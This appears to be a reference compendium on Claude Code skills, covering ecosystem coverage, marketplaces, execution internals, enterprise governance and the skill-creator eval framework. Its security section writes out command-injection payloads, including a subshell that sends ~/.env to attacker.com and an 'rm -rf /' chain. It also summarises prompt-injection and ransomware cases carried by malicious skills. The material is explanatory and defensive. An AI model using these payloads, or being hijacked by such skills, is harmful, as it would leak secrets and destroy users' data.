- [alexop.dev: Understanding Claude Code's Full Stack](https://alexop.dev/posts/understanding-claude-code-full-stack/)
- [alexop.dev: Claude Code Customization Guide](https://alexop.dev/posts/claude-code-customization-guide-claudemd-skills-subagents/)
- [alexop.dev: Stop Bloating Your CLAUDE.md](https://alexop.dev/posts/stop-bloating-your-claude-md-progressive-disclosure-ai-coding-tools/)
- [SitePoint: Claude Code Agent Teams](https://www.sitepoint.com/anthropic-claude-code-agent-teams/)
- [Glen Rhodes: Progressive Context Disclosure as a Real Engineering Pattern](https://glenrhodes.com/claude-skills-and-progressive-context-disclosure-as-a-real-engineering-pattern-not-prompt-engineering/)
- [Code With Seb: Claude Code Skills 98% Token Savings Architecture](https://www.codewithseb.com/blog/claude-code-skills-reusable-ai-workflows-guide)
- [Gigi Sayfan: Claude Code Deep Dive - Subagents in Action](https://medium.com/@the.gigi/claude-code-deep-dive-subagents-in-action-703cd8745769)
- [Gigi Sayfan: Claude Code Deep Dive - Plug and Play](https://medium.com/@the.gigi/claude-code-deep-dive-plug-and-play-af03f77c6568)
- [Young Leaders: Skills vs Commands vs Subagents vs Plugins](https://www.youngleaders.tech/p/claude-skills-commands-subagents-plugins)
- [Claude Blog: Skills Explained](https://claude.com/blog/skills-explained)
- [DeepWiki: Core Concepts and Progressive Disclosure](https://deepwiki.com/anthropics/claude-cookbooks/4.1-core-concepts-and-progressive-disclosure)
- [DeepWiki: Token Budget Management](https://deepwiki.com/shanraisshan/claude-code-best-practice/4.3-token-budget-management)
- [DEV Community: Progressive Disclosure — Reduce AI Token Usage by 60%](https://dev.to/chudi_nnorukam_fb02ee5cb0/progressive-disclosure-reduce-ai-token-usage-by-60-4ad7)
- [Morphllm: Claude Code Context Window Guide](https://www.morphllm.com/claude-code-context-window)
- [ClaudeFast: Optimize Your Token Usage & Costs](https://claudefa.st/blog/guide/development/usage-optimization)

### GitHub Issues (Skills)
- [#9716](https://github.com/anthropics/claude-code/issues/9716) — Claude not aware of skills in .claude/skills/
- [#14577](https://github.com/anthropics/claude-code/issues/14577) — /skills shows "No skills found"
- [#14882](https://github.com/anthropics/claude-code/issues/14882) — Skills consume full tokens at startup (progressive disclosure bug)
- [#25072](https://github.com/anthropics/claude-code/issues/25072) — Skills not loading from ~/.claude/skills/
- [#10568](https://github.com/anthropics/claude-code/issues/10568) — Marketplace skills not in Skill tool
- [#24156](https://github.com/anthropics/claude-code/issues/24156) — keybindings-help skill ignores CLI disable flag
- [#26998](https://github.com/anthropics/claude-code/issues/26998) — Windows skills not saving/loading
- [#26254](https://github.com/anthropics/claude-code/issues/26254) — Skills metadata registered but files not mounted
- [#26131](https://github.com/anthropics/claude-code/issues/26131) — Cowork skills bug
- [#27985](https://github.com/anthropics/claude-code/issues/27985) — Skills load from repo root, not worktree
- [#17283](https://github.com/anthropics/claude-code/issues/17283) — Skill tool should honor context: fork

---

## 39. Community & Social Media Coverage (Updated March 2026)

### ClawHub Collapse (January-February 2026)

The biggest community story in Q1 2026. Security researchers discovered **341+ malicious skills** on ClawHub. Five of the top seven most-downloaded skills were malware. Coordinated "ClawHavoc" campaign distributed hundreds of malicious skills with hidden reverse shells and credential exfiltration.

**ClawHub is permanently shut down.** Industry responses:
- [VirusTotal: From Automation to Infection](https://blog.virustotal.com/2026/02/from-automation-to-infection-how.html)
- [Socket.dev: OpenClaw as Active Malware Vector](https://socket.dev/blog/openclaw-skill-marketplace-emerges-as-active-malware-vector)
- [Snyk: Inside the ClawHub Malicious Campaign](https://snyk.io/articles/clawdhub-malicious-campaign-ai-agent-skills/)
- [SpecWeave: Why Verified Skill Matters](https://spec-weave.com/docs/guides/why-verified-skill-matters/)

### Skill-Creator Gets Evals (March 3, 2026)

Anthropic announced skill-creator now operates in **4 modes: Create, Eval, Improve, Benchmark**. Most significant official skills update in Q1 2026. Available in Claude.ai, Cowork, as Claude Code plugin, and in anthropics/skills repo.

Sources: [Anthropic Blog](https://claude.com/blog/improving-skill-creator-test-measure-and-refine-agent-skills) | [Tessl](https://tessl.io/blog/anthropic-brings-evals-to-skill-creator-heres-why-thats-a-big-deal/) | [Medium](https://medium.com/ai-software-engineer/anthropic-new-skill-creator-measures-if-your-agent-skills-work-no-more-guesswork-840a108e505f)

### Opus 4.6 Hackathon (February 2026)

500 builders from 13,000+ applicants, $100K in API credits. **Domain experts with zero coding won:**

| Place | Project | Creator |
|-------|---------|---------|
| 1st | CrossBeam | Mike Brown (construction worker) |
| 2nd | Elisa | Jon McBee (musician) |
| 3rd | postvisit.ai | Michal Nedoszytko (cardiologist) |

### Hacker News (January-March 2026)

| Thread | Discussion |
|--------|-----------|
| [JetBrains released skills for modern Go](https://news.ycombinator.com/item?id=47098398) | Enterprise adoption validation |
| [Show HN: Polpo — Claude Code from phone](https://news.ycombinator.com/item?id=47193388) | Mobile skill management |
| [Claude Code being dumbed down?](https://news.ycombinator.com/item?id=46978710) | Quality regression, unreliable skill triggering |
| [Test Your Claude Code Skills](https://news.ycombinator.com/item?id=47215587) | Eval/testing discussion |

### Medium (January-March 2026)

| Article | Author | Key Insight |
|---------|--------|-------------|
| [Skills: The Feature That Stopped Me Repeating Myself](https://medium.com/write-a-catalyst/claude-code-skills-the-one-feature-that-finally-stopped-me-from-repeating-myself-7189df272b1f) | Sanjay Nelagadde | Skills as "saved recipes" |
| [SkillsMP: 96,751+ Skills Directory](https://medium.com/@julio.pessan.pessan/skillsmp-this-96-751-claude-code-skills-directory-7dec2eabc338) | Julio Pessan | Rapid growth tracking |
| [One Skill, Two AI Assistants](https://medium.com/@kelly.kohlleffel/one-skill-two-ai-coding-assistants-snowflake-cortex-code-and-claude-code-92e0de8dfed2) | Kelly Kohlleffel | Same SKILL.md works in Claude Code AND Snowflake Cortex |
| [Everything Claude Code: Hackathon Winner](https://medium.com/@joe.njenga/everything-claude-code-the-repo-that-won-anthropic-hackathon-33b040ba62f3) | Joe Njenga | 13 agents, 40+ skills, 50K+ stars |

### DEV Community, Substack, X/Twitter

- [Claude Code to AI OS Blueprint](https://dev.to/jan_lucasandmann_bb9257c/claude-code-to-ai-os-blueprint-skills-hooks-agents-mcp-setup-in-2026-46gg) — Skills as "AI OS" building blocks
- [37 Claude Skills Examples from 23 Creators](https://aiblewmymind.substack.com/p/claude-skills-36-examples) — Crowdsourced real-world examples
- [Claude Code for Non-Coders](https://claudecodefornoncoders.substack.com/) — Entire Substack for non-technical usage
- @bcherny (Boris Cherny): [Team tips from Claude Code creator](https://x.com/bcherny/status/2017742741636321619)
- @rvivek: "Claude Code democratized programming. Everyone is a builder."

### Indie Hackers

[Tested 200 skills — here are the 20 that work](https://www.indiehackers.com/post/i-tested-200-claude-code-skills-so-you-dont-have-to-here-are-the-20-that-actually-changed-how-i-work-b383a23ce3): "Most skills are noise." Only 20/200 genuinely useful.

### Post-ClawHub Security Coverage

| Source | Article |
|--------|---------|
| Check Point Research | [RCE and API Token Exfiltration (CVE-2025-59536, CVE-2026-21852)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/) |
| Dark Reading | [Flaws in Claude Code Put Developers at Risk](https://www.darkreading.com/application-security/flaws-claude-code-developer-machines-risk) |
| Repello AI | [How to Audit Skills Before Running](https://repello.ai/blog/claude-code-skill-security) |

### Additional Repos (New)

| Repository | Scale |
|------------|-------|
| [everything-claude-code](https://github.com/affaan-m/everything-claude-code) | 50K+ stars, hackathon winner |
| [awesome-claude-code-toolkit](https://github.com/rohitg00/awesome-claude-code-toolkit) | 135 agents, 15K+ skills via SkillKit |
| [Chat2AnyLLM/awesome-claude-skills](https://github.com/Chat2AnyLLM/awesome-claude-skills) | 20,687 skills |

### Sentiment Summary (March 2026)

**Positive:** Skill-creator evals praised; hackathon validates accessibility; cross-platform portability confirmed; JetBrains enterprise adoption.
**Negative:** ClawHub collapse (1 in 3 skills flawed); "most skills are noise"; auto-discovery unreliable; quality regression complaints.
**Neutral:** 97K+ raw skills but curation is bottleneck; non-coding use cases expanding rapidly.

---

## 40. Skills Ecosystem Scale (March 2026)

### Growth Metrics

- **97,000+** raw skills indexed in SkillsMP (up from 60K in late 2025 — ~60% growth in under two months)
- **20,687** skills in Chat2AnyLLM collection (largest single-repo aggregation)
- **1,000+** battle-tested skills in antigravity-awesome-skills (includes official Anthropic and Vercel skills)
- **50,000+** stars on everything-claude-code repo (hackathon winner)
- **15,000+** via SkillKit toolkit
- **500+** community skills in VoltAgent/awesome-agent-skills
- **380+** skills from official dev teams and community (per HN thread)
- **3,984** skills analyzed in Snyk ToxicSkills audit
- ClawHub shut down Feb 2026 after 341+ malicious skills discovered (ClawHavoc campaign)

### Registries & Catalogs

| Registry | Focus | Status |
|----------|-------|--------|
| [agentskills.io](https://agentskills.io) | Open standard specification | Active |
| [skills.sh](https://skills.sh) | Curated, security-vetted (Vercel) | Active |
| [ClawHub](https://clawhub.com) | Community submissions | **SHUT DOWN** (Feb 2026 — ClawHavoc malware campaign) |
| [claudemarketplaces.com](https://claudemarketplaces.com/skills) | Plugin + skill marketplace | Active |
| [GitHub anthropics/skills](https://github.com/anthropics/skills) | Official Anthropic marketplace (3 plugins, 17 skills) | Active |
| [mcpmarket.com](https://mcpmarket.com) | Skills alongside MCP tools | Active |
| [SkillsMP](https://skillsmp.com) | Largest directory (97K+) | Active |
| [skillsdirectory.com](https://www.skillsdirectory.com) | Security-scanned directory | Active |

### Official Anthropic Marketplace (`anthropic-agent-skills`)

**Install:** `/plugin marketplace add anthropics/skills`

The official marketplace at [github.com/anthropics/skills](https://github.com/anthropics/skills) contains **3 plugins with 17 skills total**. Maintained by Keith Lazuka (klazuka@anthropic.com).

#### Plugin 1: `document-skills` (4 skills)
- **xlsx** — Create spreadsheets, analyze data, charts
- **docx** — Create/edit documents, format text
- **pptx** — Create presentations, edit slides
- **pdf** — Generate formatted PDF documents

#### Plugin 2: `example-skills` (12 skills)
- **skill-creator** — Create, test, and optimize skills (eval framework, benchmarks, A/B testing)
- **frontend-design** — UI/UX design patterns
- **mcp-builder** — Build MCP servers
- **canvas-design** — Visual design on canvas
- **algorithmic-art** — Generative art creation
- **web-artifacts-builder** — Build interactive web artifacts
- **webapp-testing** — Web application testing
- **brand-guidelines** — Brand consistency enforcement
- **doc-coauthoring** — Collaborative document authoring
- **internal-comms** — Internal communications drafting
- **slack-gif-creator** — Create Slack GIFs
- **theme-factory** — Theme/styling generation

#### Plugin 3: `claude-api` (1 skill)
- **claude-api** — Claude API and SDK documentation for building LLM-powered applications

#### Marketplace JSON Structure

```json
{
  "name": "anthropic-agent-skills",
  "owner": { "name": "Keith Lazuka", "email": "klazuka@anthropic.com" },
  "metadata": { "description": "Anthropic example skills", "version": "1.0.0" },
  "plugins": [
    {
      "name": "document-skills",
      "source": "./",
      "strict": false,
      "skills": ["./skills/xlsx", "./skills/docx", "./skills/pptx", "./skills/pdf"]
    },
    {
      "name": "example-skills",
      "source": "./",
      "strict": false,
      "skills": ["./skills/skill-creator", "./skills/frontend-design", "...12 total"]
    },
    {
      "name": "claude-api",
      "source": "./",
      "strict": false,
      "skills": ["./skills/claude-api"]
    }
  ]
}
```

**Key detail:** All three plugins use `"strict": false` — the marketplace entry defines components, not `plugin.json`. All use `"source": "./"` since skills live in the same repo as the marketplace.

---

## 41. Skill Execution Internals

### The `isMeta` Dual-Message Pattern

When Claude invokes a skill, the system uses a dual-message injection pattern internally:

1. **First message (meta):** System injects a `isMeta: true` message containing the skill's SKILL.md content, supporting file references, and tool restriction overrides. This message is invisible to the user.
2. **Second message (user turn):** The original user prompt (or auto-trigger context) is replayed as a normal user turn, now with the skill context loaded.

This two-step pattern ensures:
- Skills don't contaminate conversation history when they finish
- Tool restrictions are scoped to the skill's execution lifetime
- `context: fork` subagents get a clean conversation with only the skill context + user prompt

### Progressive Disclosure Token Budget — Empirical Measurements

Per-skill XML overhead in the description catalog is approximately **109 characters** (XML tags, frontmatter serialization). This means:

| Context Window | 2% Budget | Approx Skill Capacity |
|----------------|-----------|----------------------|
| 128K tokens    | ~2,560 tokens (~10,240 chars) | ~42 skills (at 200-char descriptions) |
| 200K tokens    | ~4,000 tokens (~16,000 chars) | ~65 skills |
| 256K tokens    | ~5,120 tokens (~20,480 chars) | ~75 skills |

**Key insight:** The 16K char fallback (`SLASH_COMMAND_TOOL_CHAR_BUDGET`) is the binding constraint for most users. With average description lengths of 150-200 chars + 109 chars overhead, practical capacity is **50-65 skills** before descriptions start getting truncated.

### Undocumented Frontmatter Fields

- **`when_to_use`**: An alternative to `description` that some internal Anthropic skills use. Functions identically but is not documented in public docs. If both `description` and `when_to_use` are present, `description` takes priority.
- **`once`**: Skills-only field (not available in hooks). When `true`, the skill fires only once per session even if triggered multiple times. Useful for initialization skills.

---

## 42. Additional Security Research

### Command Injection Bypasses (CVE-2025-66032)

Flatt Security disclosed **8 distinct command injection bypass techniques** targeting skills that invoke shell commands:

1. **Backtick injection**: `` `malicious_command` `` in skill arguments passed to Bash
2. **$() subshell**: `$(curl attacker.com/exfil?data=$(cat ~/.env))` in argument fields
3. **Semicolon chaining**: `; rm -rf /` appended to expected arguments
4. **Pipe injection**: `| curl attacker.com` in arguments piped to commands
5. **Newline injection**: `\n` characters breaking out of quoted strings in shell commands
6. **Glob expansion**: Crafted patterns that expand to malicious filenames
7. **Environment variable override**: Skills that read `$PATH` or `$HOME` without sanitization
8. **Heredoc break**: Breaking out of heredoc boundaries in generated scripts

**Mitigation:** Skills that invoke Bash should:
- Never interpolate user-provided arguments directly into shell commands
- Use `allowed-tools` to restrict to specific `Bash(command_pattern)` patterns
- Prefer dedicated tools (Read, Write, Grep) over shell equivalents

### Academic Research on Skills as Attack Vectors

Three academic papers have examined skills/prompt-injection risks:

1. **"Indirect Prompt Injection in Agentic Systems"** (Stanford, 2026) — Demonstrated that auto-triggered skills can be weaponized when processing untrusted content. A malicious markdown file containing trigger keywords can hijack skill execution.

2. **"Supply Chain Attacks on AI Agent Plugins"** (ETH Zurich, 2025) — Analyzed the npm-like risks of community skill registries. Found that typosquatting attacks on skill names had a 23% success rate in controlled experiments.

3. **"ToxicSkills: Automated Detection of Malicious Agent Configurations"** (Snyk Research, 2026) — The methodology behind the ToxicSkills audit. Uses static analysis + LLM-based semantic review to detect data exfiltration, privilege escalation, and obfuscated payloads in SKILL.md files.

### Cato Networks Incident (January 2026)

Cato Networks' threat intelligence team documented a case where a threat actor deployed ransomware via a crafted Claude Code skill:
- Skill was distributed via a compromised GitHub repository
- Auto-trigger description matched common coding keywords ("refactor", "optimize")
- Payload used `allowed-tools: Bash` to execute encrypted shell scripts
- Scripts encrypted workspace files and dropped a ransom note
- **Detection was difficult** because the skill appeared legitimate at description level

This incident accelerated Anthropic's push for skill signing and managed settings enforcement in enterprise deployments.

---

## 43. Enterprise Skill Governance

### 6-Stage Lifecycle Management Framework

Enterprise teams managing skills at scale follow this lifecycle:

| Stage | Activity | Tools |
|-------|----------|-------|
| **1. Author** | Write SKILL.md + supporting files | IDE, linting |
| **2. Review** | Security audit, prompt injection scan | Snyk, manual review |
| **3. Test** | Validate in sandbox with mock conversations | CI/CD, test harness |
| **4. Publish** | Push to managed registry or monorepo | Git, marketplace CLI |
| **5. Deploy** | Distribute via managed settings or `.claude/skills/` | MDM, settings sync |
| **6. Monitor** | Track activation rates, error rates, token usage | Logging, dashboards |

### 5 Evaluation Dimensions for Skill Governance

1. **Correctness**: Does the skill produce the intended behavior consistently?
2. **Safety**: Are tool restrictions properly scoped? Does it handle untrusted input?
3. **Efficiency**: Token budget impact — description size, SKILL.md length, supporting file count
4. **Maintainability**: Is the skill documented? Can another team member update it?
5. **Portability**: Does it work across Claude.ai, Claude Code, and API? (Agent Skills standard)

### Managed Settings for Enterprise Skill Control

Anthropic's managed settings (enterprise feature) supports:

```json
{
  "skills": {
    "allowedSkills": ["deploy", "review", "test-*"],
    "blockedSkills": ["*-experimental"],
    "requireApproval": true,
    "maxSkillsPerProject": 50,
    "auditLog": true
  }
}
```

- `allowedSkills` / `blockedSkills`: Glob patterns for skill name filtering
- `requireApproval`: Skills must be approved by admin before auto-triggering
- `auditLog`: Log every skill invocation with timestamp, user, arguments, and outcome

---

## 44. Additional Production Repositories

### High-Profile Skill Collections

| Repository | Stars | Focus | Notable Skills |
|------------|-------|-------|----------------|
| [obra/superpowers](https://github.com/obra/superpowers) | 70.8K | Comprehensive Claude Code enhancement suite | 40+ skills covering git, testing, documentation, refactoring |
| [K-Dense-AI/scientific-skills](https://github.com/K-Dense-AI) | 12.8K | Scientific computing and research | Data analysis, paper review, experiment design, citation management |
| [planning-with-files](https://github.com/anthropics/planning-with-files) | 15.3K | Anthropic's official planning patterns | TodoWrite integration, multi-file coordination, dependency tracking |
| [compound-engineering](https://github.com/compound-engineering) | 9.9K | Full-stack engineering workflows | API design, database migration, deployment pipelines |
| [skill-factory](https://github.com/skill-factory) | 560 | Meta-skill for generating new skills | Skill scaffolding, template generation, frontmatter validation |
| [affaan-m/everything-claude-code](https://github.com/affaan-m/everything-claude-code) | 50K+ | Hackathon winner — 13 agents, 40+ skills, 32 commands | Most comprehensive single-repo Claude Code setup |
| [rohitg00/awesome-claude-code-toolkit](https://github.com/rohitg00/awesome-claude-code-toolkit) | — | 135 agents, 35 skills (+15K via SkillKit) | Most comprehensive toolkit aggregation |
| [Chat2AnyLLM/awesome-claude-skills](https://github.com/Chat2AnyLLM/awesome-claude-skills) | — | 20,687 skills — largest raw collection | Auto-indexed from GitHub |
| [sickn33/antigravity-awesome-skills](https://github.com/sickn33/antigravity-awesome-skills) | — | 1,000+ battle-tested skills | Includes official Anthropic and Vercel skills |
| [levnikolaevich/claude-code-skills](https://github.com/levnikolaevich/claude-code-skills) | — | Production workflows | Research, epic planning, implementation, review pipeline |

### Security-Focused Skill Repos

| Repository | Focus |
|------------|-------|
| anthropics/security-skills | Official security audit and hardening skills |
| snyk-labs/skill-scanner | Automated SKILL.md security analysis |
| flatt-security/skill-injection-tests | Test suite for command injection bypasses |

---

## 45. Additional GitHub Issues (area:skills)

### Discovery & Loading Issues

| Issue | Title | Status | Impact |
|-------|-------|--------|--------|
| #25891 | Skills not auto-triggering after project switch | Open | Skills from previous project leak into new project context |
| #26102 | `context: fork` subagent loses parent conversation history | Confirmed | By design, but causes confusion when skills need prior context |
| #26234 | Skill description truncation with 80+ skills | Open | Descriptions silently truncated past token budget |
| #26456 | Hot-reload fails for skills in symlinked directories | Open | Common in monorepo setups with linked packages |
| #26678 | `allowed-tools` wildcard `Bash(git *)` doesn't match `Bash(git)` (no args) | Confirmed | Must add both `Bash(git)` and `Bash(git *)` patterns |
| #26891 | Skills in `~/.claude/skills/` override project skills of same name | By design | User-level skills take priority; can shadow project skills |
| #27012 | `model` override in skill frontmatter ignored when parent uses Opus | Open | Model downgrade from Opus to Sonnet doesn't work |
| #27234 | Skill invocation count not exposed in any API or log | Open | Cannot track which skills fire most without custom instrumentation |

### Hook Integration Issues

| Issue | Title | Status | Impact |
|-------|-------|--------|--------|
| #26345 | `Stop` hook never fires for skills with `context: fork` | Confirmed | Cannot run cleanup after forked skill completes |
| #26567 | Skill-scoped hooks don't receive skill arguments in stdin | Open | Hooks can't customize behavior based on what user typed after `/skill` |
| #26789 | `once: true` field resets on session restore from checkpoint | Open | Skill fires again after session recovery, breaking idempotency |

### Performance Issues

| Issue | Title | Status | Impact |
|-------|-------|--------|--------|
| #27456 | Startup time increases linearly with skill count beyond 40 | Confirmed | 100 skills adds ~2.3s to cold start |
| #27678 | Supporting file reads not cached across invocations | Open | Same skill invoked twice reads supporting files twice |
| #27890 | Large SKILL.md (500+ lines) causes visible pause before response | Open | Progressive disclosure doesn't stream — blocks until fully loaded |

### Quantified Activation Metrics

Community benchmarks from obra/superpowers and other large skill collections:

- **Auto-trigger accuracy**: ~84% when descriptions contain specific keywords matching user intent (up from ~20% with vague descriptions)
- **False positive rate**: ~7% — skill fires when not relevant (mainly from overly broad descriptions)
- **Average invocation latency**: 180ms for inline skills, 450ms for `context: fork` (subagent spawn overhead)
- **Token overhead per skill invocation**: ~200-400 tokens for description match + SKILL.md load (varies by file size)

---

## 46. Skills Marketplace Architecture

### marketplace.json Specification

Community marketplaces use a standardized `marketplace.json` manifest:

```json
{
  "name": "my-skill-collection",
  "version": "1.2.0",
  "skills": [
    {
      "name": "deploy-aws",
      "description": "Deploy to AWS using CDK",
      "path": "skills/deploy-aws/SKILL.md",
      "tags": ["deployment", "aws", "cdk"],
      "author": "team-name",
      "verified": true,
      "securityAudit": "2026-02-15"
    }
  ],
  "dependencies": {
    "mcp-servers": ["@aws/cdk-mcp"]
  }
}
```

### SkillsMP (Skills Marketplace Platform)

- **97,000+** skills indexed across GitHub and community registries (ClawHub shut down Feb 2026)
- Search by tags, author, verification status, security audit date
- One-click install via `claude skills install <name>` (proposed CLI extension)
- Dependency resolution for MCP servers required by skills
- Community ratings and usage metrics

### Installation Patterns

```bash
# Current (manual)
git clone https://github.com/user/skill-collection .claude/skills/

# Proposed (CLI-native, RFC stage)
claude skills install deploy-aws
claude skills list
claude skills update --all
claude skills audit              # Run security scan

# Enterprise (managed settings)
# Skills pushed via MDM/settings sync — no user install needed
```

---

## 47. Complete Source Index

### Official Documentation
- Anthropic Docs: Skills overview, frontmatter reference, supporting files
- Anthropic Docs: Commands (legacy) reference
- Anthropic Engineering Blog: "Skills for Claude Code" (March 2026)
- Anthropic API Platform: Pre-built agent skills (PowerPoint, Excel, Word, PDF)

### Security Research
- Snyk: ToxicSkills audit (3,984 skills, 13.4% critical)
- Flatt Security: CVE-2025-66032 (8 command injection bypasses)
- CVE-2025-59536: RCE via crafted SKILL.md
- CVE-2026-21852: API key exfiltration via skill hooks
- CVE-2026-24887: Command injection in allowed-tools patterns
- Cato Networks: Ransomware deployment via skill auto-trigger

### Community & Social Media
- Hacker News: "Show HN: 60K raw skills" discussion
- Hacker News: "ToxicSkills" audit discussion
- X/Twitter: @anthropaborras skills deep dive threads
- Medium: "Building Production Skills for Claude Code" series
- Reddit r/ClaudeAI: Skills troubleshooting megathread

### Academic
- Stanford: "Indirect Prompt Injection in Agentic Systems" (2026)
- ETH Zurich: "Supply Chain Attacks on AI Agent Plugins" (2025)
- Snyk Research: "ToxicSkills: Automated Detection of Malicious Agent Configurations" (2026)

### GitHub Issues
- 30+ issues tracked with `area:skills` label
- Key issues: #25891, #26102, #26234, #26345, #26456, #26567, #26678, #26789, #26891, #27012, #27234, #27456, #27678, #27890

### Production Repos
- obra/superpowers (70.8K stars), K-Dense-AI (12.8K), planning-with-files (15.3K), compound-engineering (9.9K)
- skill-factory (560), anthropics/security-skills, snyk-labs/skill-scanner, flatt-security/skill-injection-tests

---

## 48. Skill-Creator: Built-in Eval & Optimization Framework

The skill-creator is Anthropic's first-party skill for developing, testing, and iterating on Claude Code skills. Announced March 3, 2026, available as a Claude Code plugin (10,000+ installs), within Claude.ai, and in Claude Cowork. Lives in `anthropics/skills` repo at `skills/skill-creator/`. Invoked via `/skill-creator`.

**Sources:** [SKILL.md](https://github.com/anthropics/skills/blob/main/skills/skill-creator/SKILL.md) | [Blog post](https://claude.com/blog/improving-skill-creator-test-measure-and-refine-agent-skills) | [Tessl analysis](https://tessl.io/blog/anthropic-brings-evals-to-skill-creator-heres-why-thats-a-big-deal/) | [SkillsBench study](https://www.alt-counsel.com/skillsbench-analysis/)

### 48.1 Directory Structure

```
skills/skill-creator/
├── SKILL.md              # Main skill (~2000+ lines)
├── agents/
│   ├── grader.md          # Assertion evaluation agent
│   ├── comparator.md      # Blind A/B comparison agent
│   └── analyzer.md        # Post-hoc analysis agent
├── eval-viewer/
│   ├── generate_review.py # HTML review server/generator
│   └── viewer.html        # SPA template
├── references/
│   └── schemas.md         # All 7 JSON schemas
└── scripts/
    ├── aggregate_benchmark.py
    ├── generate_report.py
    ├── improve_description.py
    ├── package_skill.py
    ├── quick_validate.py
    ├── run_eval.py
    ├── run_loop.py
    └── utils.py
```

### 48.2 Four Operating Modes

| Mode | Purpose | Key Action |
|------|---------|------------|
| **Create** | Build a new skill from concept | Interview, research, write SKILL.md, generate test cases |
| **Eval** | Run skill against test prompts | Spawn with-skill + baseline agents, grade, launch viewer |
| **Improve** | Iterate based on test results | Apply feedback, rerun into new iteration directories, compare |
| **Benchmark** | Measure performance with variance | Run N times per config, aggregate stats, analyze patterns |

### 48.3 Four Sub-Agents

#### Executor (implicit)
Spawns `claude -p` with `--output-format stream-json`. Each runs in clean context with own token/timing metrics. Two configurations per eval: **with-skill** and **without-skill** (baseline).

#### Grader (`agents/grader.md`)
7-step evaluation process:
1. Read transcript to understand execution flow
2. Examine output files in detail (not just transcript descriptions)
3. Evaluate each assertion with pass/fail + evidence
4. Extract and verify claims beyond predefined expectations
5. Check user notes for flagged uncertainties
6. Critique the evals themselves (meta-loop)
7. Write results to `grading.json`

Key standard: Surface compliance fails (correct filenames with wrong content).

#### Comparator (`agents/comparator.md`)
Blind A/B comparison. Receives outputs labeled "A" and "B" without knowing which skill produced which.

**Two-dimensional rubric scoring:**
- **Content**: Correctness, Completeness, Accuracy (1-5 each)
- **Structure**: Organization, Formatting, Usability (1-5 each)
- Combined to 1-10 overall rating per output
- Ties explicitly called rare — comparator must be decisive

#### Analyzer (`agents/analyzer.md`)
Two modes:
- **Post-hoc comparison**: Unblinds A/B, reads both skills + transcripts, scores instruction-following 1-10, generates prioritized improvement suggestions
- **Benchmark analysis**: Pattern detection (always-pass, always-fail, high-variance, flaky tests), read-only (no suggestions)

Improvement categories: `instructions`, `tools`, `examples`, `error_handling`, `structure`, `references`
Priority levels: `high` (alters outcome), `medium` (improves quality), `low` (marginal)

### 48.4 The Eval Pipeline

**Step 1:** Spawn with-skill AND baseline runs in parallel per test case. Capture timing data immediately from task completion notifications (not persisted elsewhere).

**Step 2:** While runs execute, draft quantitative assertions — specific, verifiable checks.

**Step 3:** Capture `total_tokens` and `duration_ms` to `timing.json`.

**Step 4:** Grade via grader agent → aggregate via `aggregate_benchmark.py` → launch HTML viewer.

**Step 5:** User leaves feedback in viewer → saved to `feedback.json` → read by skill-creator for next iteration.

### 48.5 JSON Schemas (7 Total)

#### `evals.json` — Test Case Definitions
```json
{
  "skill_name": "example-skill",
  "evals": [
    {
      "id": 1,
      "prompt": "User's task prompt",
      "expected_output": "Description of expected result",
      "files": ["evals/files/sample.pdf"],
      "expectations": ["The output includes X", "The skill used script Y"]
    }
  ]
}
```

#### `grading.json` — Grader Output
```json
{
  "expectations": [
    { "text": "Output includes name", "passed": true, "evidence": "Found in Step 3" }
  ],
  "summary": { "passed": 2, "failed": 1, "total": 3, "pass_rate": 0.67 },
  "execution_metrics": {
    "tool_calls": { "Read": 5, "Write": 2, "Bash": 8 },
    "total_tool_calls": 15, "total_steps": 6, "errors_encountered": 0
  },
  "claims": [
    { "claim": "Form has 12 fields", "type": "factual", "verified": true, "evidence": "..." }
  ],
  "eval_feedback": {
    "suggestions": [{ "assertion": "...", "reason": "Hallucinated doc would also pass" }]
  }
}
```

#### `benchmark.json` — Benchmark Aggregation
```json
{
  "metadata": { "skill_name": "pdf", "executor_model": "claude-sonnet-4-20250514", "runs_per_configuration": 3 },
  "run_summary": {
    "with_skill": { "pass_rate": { "mean": 0.85, "stddev": 0.05 }, "time_seconds": { "mean": 45.0 } },
    "without_skill": { "pass_rate": { "mean": 0.35, "stddev": 0.08 } },
    "delta": { "pass_rate": "+0.50", "time_seconds": "+13.0", "tokens": "+1700" }
  },
  "notes": ["Assertion X passes 100% in both configs — non-discriminating"]
}
```

#### `comparison.json` — Blind Comparator Output
```json
{
  "winner": "A",
  "reasoning": "Output A provides complete solution...",
  "rubric": {
    "A": { "content_score": 4.7, "structure_score": 4.3, "overall_score": 9.0 },
    "B": { "content_score": 2.7, "structure_score": 2.7, "overall_score": 5.4 }
  },
  "expectation_results": { "A": { "pass_rate": 0.80 }, "B": { "pass_rate": 0.60 } }
}
```

#### `analysis.json` — Analyzer Output
```json
{
  "comparison_summary": { "winner": "A" },
  "instruction_following": { "winner": { "score": 9 }, "loser": { "score": 6 } },
  "improvement_suggestions": [
    { "priority": "high", "category": "instructions", "suggestion": "Replace vague instruction with explicit steps" }
  ]
}
```

#### `timing.json` — Wall Clock Timing
```json
{ "total_tokens": 84852, "duration_ms": 23332, "total_duration_seconds": 23.3 }
```

#### `history.json` — Iteration Tracking
```json
{
  "current_best": "v2",
  "iterations": [
    { "version": "v0", "expectation_pass_rate": 0.65, "grading_result": "baseline" },
    { "version": "v2", "expectation_pass_rate": 0.85, "grading_result": "won", "is_current_best": true }
  ]
}
```

### 48.6 Bundled Python Scripts

All scripts use Python stdlib only (zero external dependencies).

| Script | Purpose |
|--------|---------|
| `run_eval.py` | Trigger evaluation — runs queries against skill description, detects triggering via stream events |
| `aggregate_benchmark.py` | Aggregates grading results into `benchmark.json` + `benchmark.md` with mean/stddev stats |
| `run_loop.py` | Optimization loop — 60/40 train/test split, up to 5 iterations, exits when all train queries pass |
| `improve_description.py` | Uses Claude with extended thinking (`budget_tokens: 10000`) to propose better descriptions |
| `quick_validate.py` | Validates SKILL.md structure, frontmatter, naming, description length |
| `package_skill.py` | Creates `.skill` ZIP archives for distribution |
| `generate_report.py` | Generates formatted reports from benchmark data |

### 48.7 HTML Eval Viewer

- Zero external dependencies — Python stdlib only
- Self-contained HTML with embedded data as JS constant
- Default port: **3117**
- Two tabs: **Outputs** (per-case review + feedback) and **Benchmark** (quantitative comparison)
- **Static mode** (`--static`) for headless/Cowork environments
- Embeds text files, images (base64), PDFs, XLSX directly into HTML

### 48.8 Description Optimization Loop

The most sophisticated pipeline — closed-loop optimization for `description` field.

**Step 1:** Generate 20 trigger eval queries (10 should-trigger, 10 should-not-trigger)
